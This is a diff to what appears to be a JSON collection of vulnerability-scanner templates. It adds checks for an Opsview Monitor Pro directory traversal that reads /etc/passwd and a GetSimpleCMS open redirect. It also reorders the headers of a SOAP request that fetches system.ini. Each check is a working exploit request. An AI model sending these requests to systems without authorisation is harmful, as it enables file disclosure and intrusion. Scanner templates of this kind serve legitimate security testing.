@@ -4558,6 +4558,21 @@
       ]
     },
     {
+      "id": "CVE-2016-10367",
+      "info": {
+        "name": "Opsview Monitor Pro - Unauthenticated Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/monitoring/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2016-10924",
       "info": {
         "name": "Wordpress Zedna eBook download <1.2 - Local File Inclusion",
@@ -9949,6 +9964,20 @@
       ]
     },
     {
+      "id": "CVE-2019-9915",
+      "info": {
+        "name": "GetSimpleCMS 3.3.13 - Open Redirection",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /admin/index.php?redirect=https://interact.sh/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nuserid={{username}}&pwd={{password}}&submitted=Login\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-9922",
       "info": {
         "name": "Joomla! Harmis Messenger 1.2.2 - Local File Inclusion",
@@ -11616,9 +11645,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
           },
           "method": "POST",
           "path": [
